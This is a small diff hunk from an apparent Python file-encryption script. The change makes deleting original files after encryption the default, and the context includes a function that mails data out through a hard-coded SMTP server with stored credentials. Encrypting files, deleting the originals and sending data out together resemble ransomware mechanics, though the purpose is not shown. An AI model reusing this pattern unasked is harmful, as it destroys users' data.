@@ -36,7 +36,7 @@ def mail(s):
     server='mail.pata.ovh:587'
     sendMail(sender,mdp,sender,s,server)
 
-AUTORM="-rm" in argv
+AUTORM=not "-keep" in argv
 LEN_READ=1024
 FILE_EXT='.enc'
 
